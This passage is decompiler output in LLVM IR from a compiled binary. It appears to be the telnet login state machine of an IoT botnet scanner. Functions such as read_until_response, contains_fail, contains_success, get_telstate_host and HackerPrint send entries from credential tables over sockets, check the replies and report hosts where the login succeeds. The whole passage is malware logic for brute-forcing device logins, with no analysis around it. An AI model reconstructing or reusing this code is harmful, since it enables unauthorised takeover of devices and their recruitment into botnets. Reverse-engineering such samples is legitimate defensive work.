dec_label_pc_1e960:                               ; preds = %dec_label_pc_1e68c
  %v3_1e964 = icmp eq i32 %v5_1e764, -1
  br i1 %v3_1e964, label %dec_label_pc_1e96c, label %dec_label_pc_1e9e4

dec_label_pc_1e96c:                               ; preds = %dec_label_pc_1e960
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e984 = load i32, i32* %v1_1e6a4, align 4
  %v3_1e98c = call i32 @sclose(i32 %v2_1e984, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1e9ac = add i32 %v2_1e134, 8
  %v3_1e9b4 = inttoptr i32 %v2_1e9ac to i8*
  store i8 0, i8* %v3_1e9b4, align 4
  store i32 %v2_1e9ac, i32* %r2.global-to-local, align 4
  %v3_1e9dc = add i32 %v2_1e134, 9
  %v4_1e9dc = inttoptr i32 %v3_1e9dc to i8*
  store i8 1, i8* %v4_1e9dc, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1e9e4:                               ; preds = %dec_label_pc_1e960
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ea04 = load i32, i32* %v1_1e13c, align 4
  %v1_1ea08 = add i32 %v2_1ea04, 6
  store i32 %v1_1ea08, i32* @r4, align 4
  %v2_1ea10 = call i32 @__GI_time(i32* null)
  %v0_1ea18 = load i32, i32* @r4, align 4
  %v3_1ea18 = icmp ult i32 %v0_1ea18, %v2_1ea10
  br i1 %v3_1ea18, label %dec_label_pc_1ea20, label %dec_label_pc_1f6c0

dec_label_pc_1ea20:                               ; preds = %dec_label_pc_1e9e4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ea38 = load i32, i32* %v1_1e6a4, align 4
  %v3_1ea40 = call i32 @sclose(i32 %v2_1ea38, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1ea60 = add i32 %v2_1e134, 8
  %v3_1ea68 = inttoptr i32 %v2_1ea60 to i8*
  store i8 0, i8* %v3_1ea68, align 4
  store i32 %v2_1ea60, i32* %r2.global-to-local, align 4
  %v3_1ea90 = add i32 %v2_1e134, 9
  %v4_1ea90 = inttoptr i32 %v3_1ea90 to i8*
  store i8 1, i8* %v4_1ea90, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1ea98:                               ; preds = %dec_label_pc_1e180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1eab0 = inttoptr i32 %v2_1e134 to i32*
  %v2_1eab0 = load i32, i32* %v1_1eab0, align 4
  store i32 %v2_1eab0, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ead0 = add i32 %v2_1e130, %v2_1e914
  %v1_1ead4 = inttoptr i32 %v2_1ead0 to i32*
  %v2_1ead4 = load i32, i32* %v1_1ead4, align 4
  store i32 %v2_1ead4, i32* %r2.global-to-local, align 4
  %v1_1eadc = load i32, i32* @sp, align 4
  %v2_1eadc = inttoptr i32 %v1_1eadc to i32*
  store i32 ptrtoint (i32* @global_var_429b4 to i32), i32* %v2_1eadc, align 4
  %v0_1eae0 = load i32, i32* %ip.global-to-local, align 4
  %v4_1eaf0 = inttoptr i32 %v2_1ead4 to i8*
  %v5_1eaf0 = call i32 @read_until_response(i32 %v0_1eae0, i32 10, i8* %v4_1eaf0, i32 32676)
  %v2_1eaf8 = icmp eq i32 %v5_1eaf0, 0
  br i1 %v2_1eaf8, label %dec_label_pc_1eb90, label %dec_label_pc_1eb00

dec_label_pc_1eb00:                               ; preds = %dec_label_pc_1ea98
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1eb20 = load i32, i32* %v1_1ead4, align 4
  %v3_1eb28 = call i32 @contains_fail(i32 %v2_1eb20, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1eb30 = icmp eq i32 %v3_1eb28, 0
  %v2_1eb80 = add i32 %v2_1e134, 8
  store i32 %v2_1eb80, i32* %r2.global-to-local, align 4
  br i1 %v2_1eb30, label %dec_label_pc_1eb64, label %dec_label_pc_1eb38

dec_label_pc_1eb38:                               ; preds = %dec_label_pc_1eb00
  %v3_1eb5c = inttoptr i32 %v2_1eb80 to i8*
  store i8 0, i8* %v3_1eb5c, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1eb64:                               ; preds = %dec_label_pc_1eb00
  %v3_1eb88 = inttoptr i32 %v2_1eb80 to i8*
  store i8 3, i8* %v3_1eb88, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1eb90:                               ; preds = %dec_label_pc_1ea98
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ebb0 = load i32, i32* %v1_1e13c, align 4
  %v1_1ebb4 = add i32 %v2_1ebb0, 6
  store i32 %v1_1ebb4, i32* @r4, align 4
  %v2_1ebbc = call i32 @__GI_time(i32* null)
  %v0_1ebc4 = load i32, i32* @r4, align 4
  %v3_1ebc4 = icmp ult i32 %v0_1ebc4, %v2_1ebbc
  br i1 %v3_1ebc4, label %dec_label_pc_1ebcc, label %dec_label_pc_1f6c0

dec_label_pc_1ebcc:                               ; preds = %dec_label_pc_1eb90
  %v2_1ebe8 = add i32 %v2_1e134, 8
  %v3_1ebf0 = inttoptr i32 %v2_1ebe8 to i8*
  store i8 0, i8* %v3_1ebf0, align 4
  store i32 %v2_1ebe8, i32* %r2.global-to-local, align 4
  %v3_1ec18 = add i32 %v2_1e134, 9
  %v4_1ec18 = inttoptr i32 %v3_1ec18 to i8*
  store i8 1, i8* %v4_1ec18, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1ec20:                               ; preds = %dec_label_pc_1e180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1ec38 = inttoptr i32 %v2_1e134 to i32*
  %v2_1ec38 = load i32, i32* %v1_1ec38, align 4
  store i32 %v2_1ec38, i32* @r4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ec58 = add i32 %v2_1e134, 8
  %v1_1ec5c = add i32 %v2_1e134, 10
  %v2_1ec5c = inttoptr i32 %v1_1ec5c to i8*
  %v3_1ec5c = load i8, i8* %v2_1ec5c, align 2
  %v4_1ec5c = zext i8 %v3_1ec5c to i32
  store i32 %v4_1ec5c, i32* %r2.global-to-local, align 4
  %v4_1ec68 = mul nuw nsw i32 %v4_1ec5c, 4
  %v5_1ec68 = add i32 %v4_1ec68, ptrtoint ([7 x i8*]* @global_var_42998.2656 to i32)
  %v6_1ec68 = inttoptr i32 %v5_1ec68 to i32*
  %v7_1ec68 = load i32, i32* %v6_1ec68, align 4
  store i32 %v7_1ec68, i32* @r5, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1ec8c = load i8, i8* %v2_1ec5c, align 2
  %v4_1ec8c = zext i8 %v3_1ec8c to i32
  store i32 %v4_1ec8c, i32* %r2.global-to-local, align 4
  %v4_1ec98 = mul nuw nsw i32 %v4_1ec8c, 4
  %v5_1ec98 = add i32 %v4_1ec98, ptrtoint ([7 x i8*]* @global_var_42998.2656 to i32)
  %v6_1ec98 = inttoptr i32 %v5_1ec98 to i32*
  %v7_1ec98 = load i32, i32* %v6_1ec98, align 4
  %v1_1ec9c = inttoptr i32 %v7_1ec98 to i8*
  %v3_1eca0 = call i32 @strlen(i8* %v1_1ec9c)
  %v0_1eca8 = load i32, i32* @r4, align 4
  %v0_1ecac = load i32, i32* @r5, align 4
  store i32 %v3_1eca0, i32* %r2.global-to-local, align 4
  %v4_1ecb8 = call i32 @__libc_send(i32 %v0_1eca8, i32 %v0_1ecac, i32 %v3_1eca0, i32 16384)
  %v1_1ecc0 = icmp slt i32 %v4_1ecb8, 0
  br i1 %v1_1ecc0, label %dec_label_pc_1ecc8, label %dec_label_pc_1ed1c

dec_label_pc_1ecc8:                               ; preds = %dec_label_pc_1ec20
  %v3_1ecec = inttoptr i32 %v2_1ec58 to i8*
  store i8 0, i8* %v3_1ecec, align 4
  store i32 %v2_1ec58, i32* %r2.global-to-local, align 4
  %v3_1ed14 = add i32 %v2_1e134, 9
  %v4_1ed14 = inttoptr i32 %v3_1ed14 to i8*
  store i8 1, i8* %v4_1ed14, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1ed1c:                               ; preds = %dec_label_pc_1ec20
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ed34 = load i32, i32* %v1_1ec38, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_1ed48 = call i32 @__libc_send(i32 %v2_1ed34, i32 ptrtoint ([3 x i8]* @global_var_37150.2658 to i32), i32 2, i32 16384)
  %v1_1ed50 = icmp slt i32 %v5_1ed48, 0
  store i32 %v2_1ec58, i32* %r2.global-to-local, align 4
  br i1 %v1_1ed50, label %dec_label_pc_1ed58, label %dec_label_pc_1edac

dec_label_pc_1ed58:                               ; preds = %dec_label_pc_1ed1c
  %v3_1ed7c = inttoptr i32 %v2_1ec58 to i8*
  store i8 0, i8* %v3_1ed7c, align 4
  store i32 %v2_1ec58, i32* %r2.global-to-local, align 4
  %v3_1eda4 = add i32 %v2_1e134, 9
  %v4_1eda4 = inttoptr i32 %v3_1eda4 to i8*
  store i8 1, i8* %v4_1eda4, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1edac:                               ; preds = %dec_label_pc_1ed1c
  %v3_1edd0 = inttoptr i32 %v2_1ec58 to i8*
  store i8 4, i8* %v3_1edd0, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1edd8:                               ; preds = %dec_label_pc_1e180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1edf0 = inttoptr i32 %v2_1e134 to i32*
  %v2_1edf0 = load i32, i32* %v1_1edf0, align 4
  store i32 %v2_1edf0, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ee10 = add i32 %v2_1e130, %v2_1e914
  %v1_1ee14 = inttoptr i32 %v2_1ee10 to i32*
  %v2_1ee14 = load i32, i32* %v1_1ee14, align 4
  store i32 %v2_1ee14, i32* %r2.global-to-local, align 4
  %v1_1ee1c = load i32, i32* @sp, align 4
  %v2_1ee1c = inttoptr i32 %v1_1ee1c to i32*
  store i32 ptrtoint (i32* @global_var_429b4 to i32), i32* %v2_1ee1c, align 4
  %v0_1ee20 = load i32, i32* %ip.global-to-local, align 4
  %v4_1ee30 = inttoptr i32 %v2_1ee14 to i8*
  %v5_1ee30 = call i32 @read_until_response(i32 %v0_1ee20, i32 10, i8* %v4_1ee30, i32 32676)
  %v2_1ee38 = icmp eq i32 %v5_1ee30, 0
  br i1 %v2_1ee38, label %dec_label_pc_1eed0, label %dec_label_pc_1ee40

dec_label_pc_1ee40:                               ; preds = %dec_label_pc_1edd8
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ee60 = load i32, i32* %v1_1ee14, align 4
  %v3_1ee68 = call i32 @contains_fail(i32 %v2_1ee60, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1ee70 = icmp eq i32 %v3_1ee68, 0
  %v2_1eec0 = add i32 %v2_1e134, 8
  store i32 %v2_1eec0, i32* %r2.global-to-local, align 4
  br i1 %v2_1ee70, label %dec_label_pc_1eea4, label %dec_label_pc_1ee78

dec_label_pc_1ee78:                               ; preds = %dec_label_pc_1ee40
  %v3_1ee9c = inttoptr i32 %v2_1eec0 to i8*
  store i8 0, i8* %v3_1ee9c, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1eea4:                               ; preds = %dec_label_pc_1ee40
  %v3_1eec8 = inttoptr i32 %v2_1eec0 to i8*
  store i8 5, i8* %v3_1eec8, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1eed0:                               ; preds = %dec_label_pc_1edd8
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1eef0 = load i32, i32* %v1_1e13c, align 4
  %v1_1eef4 = add i32 %v2_1eef0, 6
  store i32 %v1_1eef4, i32* @r4, align 4
  %v2_1eefc = call i32 @__GI_time(i32* null)
  %v0_1ef04 = load i32, i32* @r4, align 4
  %v3_1ef04 = icmp ult i32 %v0_1ef04, %v2_1eefc
  br i1 %v3_1ef04, label %dec_label_pc_1ef0c, label %dec_label_pc_1f6c0

dec_label_pc_1ef0c:                               ; preds = %dec_label_pc_1eed0
  %v2_1ef28 = add i32 %v2_1e134, 8
  %v3_1ef30 = inttoptr i32 %v2_1ef28 to i8*
  store i8 0, i8* %v3_1ef30, align 4
  store i32 %v2_1ef28, i32* %r2.global-to-local, align 4
  %v3_1ef58 = add i32 %v2_1e134, 9
  %v4_1ef58 = inttoptr i32 %v3_1ef58 to i8*
  store i8 1, i8* %v4_1ef58, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1ef60:                               ; preds = %dec_label_pc_1e180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1ef78 = inttoptr i32 %v2_1e134 to i32*
  %v2_1ef78 = load i32, i32* %v1_1ef78, align 4
  store i32 %v2_1ef78, i32* @r4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1ef98 = add i32 %v2_1e134, 8
  %v1_1ef9c = add i32 %v2_1e134, 11
  %v2_1ef9c = inttoptr i32 %v1_1ef9c to i8*
  %v3_1ef9c = load i8, i8* %v2_1ef9c, align 1
  %v4_1ef9c = zext i8 %v3_1ef9c to i32
  store i32 %v4_1ef9c, i32* %r2.global-to-local, align 4
  %v4_1efa8 = mul nuw nsw i32 %v4_1ef9c, 4
  %v5_1efa8 = add i32 %v4_1efa8, ptrtoint ([4 x i8*]* @global_var_429a4.2660 to i32)
  %v6_1efa8 = inttoptr i32 %v5_1efa8 to i32*
  %v7_1efa8 = load i32, i32* %v6_1efa8, align 4
  store i32 %v7_1efa8, i32* @r5, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1efcc = load i8, i8* %v2_1ef9c, align 1
  %v4_1efcc = zext i8 %v3_1efcc to i32
  store i32 %v4_1efcc, i32* %r2.global-to-local, align 4
  %v4_1efd8 = mul nuw nsw i32 %v4_1efcc, 4
  %v5_1efd8 = add i32 %v4_1efd8, ptrtoint ([4 x i8*]* @global_var_429a4.2660 to i32)
  %v6_1efd8 = inttoptr i32 %v5_1efd8 to i32*
  %v7_1efd8 = load i32, i32* %v6_1efd8, align 4
  %v1_1efdc = inttoptr i32 %v7_1efd8 to i8*
  %v3_1efe0 = call i32 @strlen(i8* %v1_1efdc)
  %v0_1efe8 = load i32, i32* @r4, align 4
  %v0_1efec = load i32, i32* @r5, align 4
  store i32 %v3_1efe0, i32* %r2.global-to-local, align 4
  %v4_1eff8 = call i32 @__libc_send(i32 %v0_1efe8, i32 %v0_1efec, i32 %v3_1efe0, i32 16384)
  %v1_1f000 = icmp slt i32 %v4_1eff8, 0
  br i1 %v1_1f000, label %dec_label_pc_1f008, label %dec_label_pc_1f05c

dec_label_pc_1f008:                               ; preds = %dec_label_pc_1ef60
  %v3_1f02c = inttoptr i32 %v2_1ef98 to i8*
  store i8 0, i8* %v3_1f02c, align 4
  store i32 %v2_1ef98, i32* %r2.global-to-local, align 4
  %v3_1f054 = add i32 %v2_1e134, 9
  %v4_1f054 = inttoptr i32 %v3_1f054 to i8*
  store i8 1, i8* %v4_1f054, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1f05c:                               ; preds = %dec_label_pc_1ef60
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f074 = load i32, i32* %v1_1ef78, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_1f088 = call i32 @__libc_send(i32 %v2_1f074, i32 ptrtoint ([3 x i8]* @global_var_37150.2658 to i32), i32 2, i32 16384)
  %v1_1f090 = icmp slt i32 %v5_1f088, 0
  store i32 %v2_1ef98, i32* %r2.global-to-local, align 4
  br i1 %v1_1f090, label %dec_label_pc_1f098, label %dec_label_pc_1f0ec

dec_label_pc_1f098:                               ; preds = %dec_label_pc_1f05c
  %v3_1f0bc = inttoptr i32 %v2_1ef98 to i8*
  store i8 0, i8* %v3_1f0bc, align 4
  store i32 %v2_1ef98, i32* %r2.global-to-local, align 4
  %v3_1f0e4 = add i32 %v2_1e134, 9
  %v4_1f0e4 = inttoptr i32 %v3_1f0e4 to i8*
  store i8 1, i8* %v4_1f0e4, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1f0ec:                               ; preds = %dec_label_pc_1f05c
  %v3_1f110 = inttoptr i32 %v2_1ef98 to i8*
  store i8 6, i8* %v3_1f110, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1f118:                               ; preds = %dec_label_pc_1e180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1f130 = inttoptr i32 %v2_1e134 to i32*
  %v2_1f130 = load i32, i32* %v1_1f130, align 4
  store i32 %v2_1f130, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f150 = add i32 %v2_1e130, %v2_1e914
  %v1_1f154 = inttoptr i32 %v2_1f150 to i32*
  %v2_1f154 = load i32, i32* %v1_1f154, align 4
  store i32 %v2_1f154, i32* %r2.global-to-local, align 4
  %v1_1f15c = load i32, i32* @sp, align 4
  %v2_1f15c = inttoptr i32 %v1_1f15c to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_429f8.2662 to i32), i32* %v2_1f15c, align 4
  %v0_1f160 = load i32, i32* %ip.global-to-local, align 4
  %v4_1f170 = inttoptr i32 %v2_1f154 to i8*
  %v5_1f170 = call i32 @read_until_response(i32 %v0_1f160, i32 10, i8* %v4_1f170, i32 32676)
  %v2_1f178 = icmp eq i32 %v5_1f170, 0
  br i1 %v2_1f178, label %dec_label_pc_1f474, label %dec_label_pc_1f180

dec_label_pc_1f180:                               ; preds = %dec_label_pc_1f118
  store i32 %storemerge612, i32* @r4, align 4
  %v2_1f188 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_1f19c = load i32, i32* @r4, align 4
  %v2_1f1a8 = mul i32 %v0_1f19c, 28
  %v2_1f1b0 = add i32 %v2_1f48c, %v2_1f1a8
  %v2_1f1b4 = inttoptr i32 %v2_1f1b0 to i32*
  store i32 %v2_1f188, i32* %v2_1f1b4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f1d4 = add i32 %v2_1e134, 24
  %v1_1f1d8 = inttoptr i32 %v2_1f1d4 to i32*
  %v2_1f1d8 = load i32, i32* %v1_1f1d8, align 4
  %v3_1f1e0 = call i32 @contains_fail(i32 %v2_1f1d8, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1f1e8 = icmp eq i32 %v3_1f1e0, 0
  br i1 %v2_1f1e8, label %dec_label_pc_1f21c, label %dec_label_pc_1f1f0

dec_label_pc_1f1f0:                               ; preds = %dec_label_pc_1f180
  %v2_1f20c = add i32 %v2_1e134, 8
  store i32 %v2_1f20c, i32* %r2.global-to-local, align 4
  %v3_1f214 = inttoptr i32 %v2_1f20c to i8*
  store i8 0, i8* %v3_1f214, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1f21c:                               ; preds = %dec_label_pc_1f180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f23c = load i32, i32* %v1_1f1d8, align 4
  %v3_1f244 = call i32 @contains_success(i32 %v2_1f23c, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1f24c = icmp eq i32 %v3_1f244, 0
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f43c = add i32 %v2_1e134, 8
  br i1 %v2_1f24c, label %dec_label_pc_1f420, label %dec_label_pc_1f254

dec_label_pc_1f254:                               ; preds = %dec_label_pc_1f21c
  %v1_1f274 = add i32 %v2_1e134, 9
  %v2_1f274 = inttoptr i32 %v1_1f274 to i8*
  %v3_1f274 = load i8, i8* %v2_1f274, align 1
  %v7_1f278 = icmp eq i8 %v3_1f274, 2
  br i1 %v7_1f278, label %dec_label_pc_1f280, label %dec_label_pc_1f2ac

dec_label_pc_1f280:                               ; preds = %dec_label_pc_1f254
  store i32 %v2_1f43c, i32* %r2.global-to-local, align 4
  %v3_1f2a4 = inttoptr i32 %v2_1f43c to i8*
  store i8 7, i8* %v3_1f2a4, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1f2ac:                               ; preds = %dec_label_pc_1f254
  %v2_1f2b0 = load i32, i32* @global_var_42c60.61, align 4
  store i32 %v2_1f2b0, i32* @r4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1f2d0 = call i32 @get_telstate_host(i32 %v2_1e134, i32 %v3_1e038, i32 %v3_1e128)
  store i32 %v3_1f2d0, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1f2f8 = add i32 %v2_1e134, 10
  %v2_1f2f8 = inttoptr i32 %v1_1f2f8 to i8*
  %v3_1f2f8 = load i8, i8* %v2_1f2f8, align 2
  %v4_1f2f8 = zext i8 %v3_1f2f8 to i32
  store i32 %v4_1f2f8, i32* %r2.global-to-local, align 4
  %v4_1f304 = mul nuw nsw i32 %v4_1f2f8, 4
  %v5_1f304 = add i32 %v4_1f304, ptrtoint ([7 x i8*]* @global_var_42998.2656 to i32)
  %v6_1f304 = inttoptr i32 %v5_1f304 to i32*
  %v7_1f304 = load i32, i32* %v6_1f304, align 4
  store i32 %v7_1f304, i32* @lr, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1f328 = add i32 %v2_1e134, 11
  %v2_1f328 = inttoptr i32 %v1_1f328 to i8*
  %v3_1f328 = load i8, i8* %v2_1f328, align 1
  %v4_1f328 = zext i8 %v3_1f328 to i32
  store i32 %v4_1f328, i32* %r2.global-to-local, align 4
  %v4_1f334 = mul nuw nsw i32 %v4_1f328, 4
  %v5_1f334 = add i32 %v4_1f334, ptrtoint ([4 x i8*]* @global_var_429a4.2660 to i32)
  %v6_1f334 = inttoptr i32 %v5_1f334 to i32*
  %v7_1f334 = load i32, i32* %v6_1f334, align 4
  %v1_1f338 = load i32, i32* @sp, align 4
  %v2_1f338 = inttoptr i32 %v1_1f338 to i32*
  store i32 %v7_1f334, i32* %v2_1f338, align 4
  %v0_1f33c = load i32, i32* @r4, align 4
  %v0_1f344 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1f344, i32* @r2, align 4
  %v2_1f34c = call i32 @HackerPrint(i32 %v0_1f33c, i32 ptrtoint (i32* @global_var_37154.2665 to i32))
  %v2_1f354 = load i32, i32* @global_var_42c60.61, align 4
  store i32 %v2_1f354, i32* @r4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1f374 = call i32 @get_telstate_host(i32 %v2_1e134, i32 %v3_1e038, i32 %v3_1e128)
  store i32 %v3_1f374, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1f39c = load i8, i8* %v2_1f2f8, align 2
  %v4_1f39c = zext i8 %v3_1f39c to i32
  store i32 %v4_1f39c, i32* %r2.global-to-local, align 4
  %v4_1f3a8 = mul nuw nsw i32 %v4_1f39c, 4
  %v5_1f3a8 = add i32 %v4_1f3a8, ptrtoint ([7 x i8*]* @global_var_42998.2656 to i32)
  %v6_1f3a8 = inttoptr i32 %v5_1f3a8 to i32*
  %v7_1f3a8 = load i32, i32* %v6_1f3a8, align 4
  store i32 %v7_1f3a8, i32* @lr, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1f3cc = load i8, i8* %v2_1f328, align 1
  %v4_1f3cc = zext i8 %v3_1f3cc to i32
  store i32 %v4_1f3cc, i32* %r2.global-to-local, align 4
  %v4_1f3d8 = mul nuw nsw i32 %v4_1f3cc, 4
  %v5_1f3d8 = add i32 %v4_1f3d8, ptrtoint ([4 x i8*]* @global_var_429a4.2660 to i32)
  %v6_1f3d8 = inttoptr i32 %v5_1f3d8 to i32*
  %v7_1f3d8 = load i32, i32* %v6_1f3d8, align 4
  %v1_1f3dc = load i32, i32* @sp, align 4
  %v2_1f3dc = inttoptr i32 %v1_1f3dc to i32*
  store i32 %v7_1f3d8, i32* %v2_1f3dc, align 4
  %v0_1f3e0 = load i32, i32* @r4, align 4
  %v0_1f3e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1f3e8, i32* @r2, align 4
  %v3_1f3f0 = call i32 @HackerPrint(i32 %v0_1f3e0, i32 ptrtoint ([16 x i8]* @global_var_371c0.2667 to i32))
  store i32 %v2_1f43c, i32* %r2.global-to-local, align 4
  %v3_1f418 = inttoptr i32 %v2_1f43c to i8*
  store i8 7, i8* %v3_1f418, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1f420:                               ; preds = %dec_label_pc_1f21c
  %v3_1f444 = inttoptr i32 %v2_1f43c to i8*
  store i8 0, i8* %v3_1f444, align 4
  store i32 %v2_1f43c, i32* %r2.global-to-local, align 4
  %v3_1f46c = add i32 %v2_1e134, 9
  %v4_1f46c = inttoptr i32 %v3_1f46c to i8*
  store i8 1, i8* %v4_1f46c, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1f474:                               ; preds = %dec_label_pc_1f118
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f490 = add i32 %v2_1e130, %v2_1f48c
  %v1_1f494 = inttoptr i32 %v2_1f490 to i32*
  %v2_1f494 = load i32, i32* %v1_1f494, align 4
  %v1_1f498 = add i32 %v2_1f494, 7
  store i32 %v1_1f498, i32* @r4, align 4
  %v2_1f4a0 = call i32 @__GI_time(i32* null)
  %v0_1f4a8 = load i32, i32* @r4, align 4
  %v3_1f4a8 = icmp ult i32 %v0_1f4a8, %v2_1f4a0
  br i1 %v3_1f4a8, label %dec_label_pc_1f4b0, label %dec_label_pc_1f6c0

dec_label_pc_1f4b0:                               ; preds = %dec_label_pc_1f474
  %v2_1f4cc = add i32 %v2_1e134, 8
  %v3_1f4d4 = inttoptr i32 %v2_1f4cc to i8*
  store i8 0, i8* %v3_1f4d4, align 4
  store i32 %v2_1f4cc, i32* %r2.global-to-local, align 4
  %v3_1f4fc = add i32 %v2_1e134, 9
  %v4_1f4fc = inttoptr i32 %v3_1f4fc to i8*
  store i8 1, i8* %v4_1f4fc, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1f504:                               ; preds = %dec_label_pc_1e180
  store i32 %storemerge612, i32* @r4, align 4
  %v2_1f50c = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_1f520 = load i32, i32* @r4, align 4
  %v2_1f52c = mul i32 %v0_1f520, 28
  %v2_1f534 = add i32 %v2_1f48c, %v2_1f52c
  %v2_1f538 = inttoptr i32 %v2_1f534 to i32*
  store i32 %v2_1f50c, i32* %v2_1f538, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1f554 = inttoptr i32 %v2_1e134 to i32*
  %v2_1f554 = load i32, i32* %v1_1f554, align 4
  store i32 %v2_1f554, i32* @r4, align 4
  %v2_1f55c = load i32, i32* bitcast ([324 x i8]** @global_var_429b0.2669 to i32*), align 4
  store i32 %v2_1f55c, i32* @r5, align 4
  %v1_1f568 = inttoptr i32 %v2_1f55c to i8*
  %v3_1f56c = call i32 @strlen(i8* %v1_1f568)
  %v0_1f574 = load i32, i32* @r4, align 4
  %v0_1f578 = load i32, i32* @r5, align 4
  store i32 %v3_1f56c, i32* %r2.global-to-local, align 4
  %v5_1f584 = call i32 @__libc_send(i32 %v0_1f574, i32 %v0_1f578, i32 %v3_1f56c, i32 16384)
  %v1_1f58c = icmp slt i32 %v5_1f584, 0
  br i1 %v1_1f58c, label %dec_label_pc_1f594, label %dec_label_pc_1f60c

dec_label_pc_1f594:                               ; preds = %dec_label_pc_1f504
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f5ac = load i32, i32* %v1_1f554, align 4
  %v3_1f5b4 = call i32 @sclose(i32 %v2_1f5ac, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1f5d4 = add i32 %v2_1e134, 8
  %v3_1f5dc = inttoptr i32 %v2_1f5d4 to i8*
  store i8 0, i8* %v3_1f5dc, align 4
  store i32 %v2_1f5d4, i32* %r2.global-to-local, align 4
  %v3_1f604 = add i32 %v2_1e134, 9
  %v4_1f604 = inttoptr i32 %v3_1f604 to i8*
  store i8 1, i8* %v4_1f604, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1f60c:                               ; preds = %dec_label_pc_1f504
  %v2_1f628 = add i32 %v2_1e134, 8
  %v3_1f630 = add i32 %v2_1e134, 9
  %v4_1f630 = inttoptr i32 %v3_1f630 to i8*
  store i8 3, i8* %v4_1f630, align 1
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1f650 = add i32 %v2_1e130, %v2_1f48c
  %v1_1f654 = inttoptr i32 %v2_1f650 to i32*
  %v2_1f654 = load i32, i32* %v1_1f654, align 4
  %v1_1f658 = add i32 %v2_1f654, 60
  store i32 %v1_1f658, i32* @r4, align 4
  %v2_1f660 = call i32 @__GI_time(i32* null)
  %v0_1f668 = load i32, i32* @r4, align 4
  %v3_1f668 = icmp ult i32 %v0_1f668, %v2_1f660
  br i1 %v3_1f668, label %dec_label_pc_1f670, label %dec_label_pc_1f6c0

dec_label_pc_1f670:                               ; preds = %dec_label_pc_1f60c
  %v3_1f694 = inttoptr i32 %v2_1f628 to i8*
  store i8 0, i8* %v3_1f694, align 4
  store i32 %v2_1f628, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v4_1f630, align 1
  br label %dec_label_pc_1f6c0

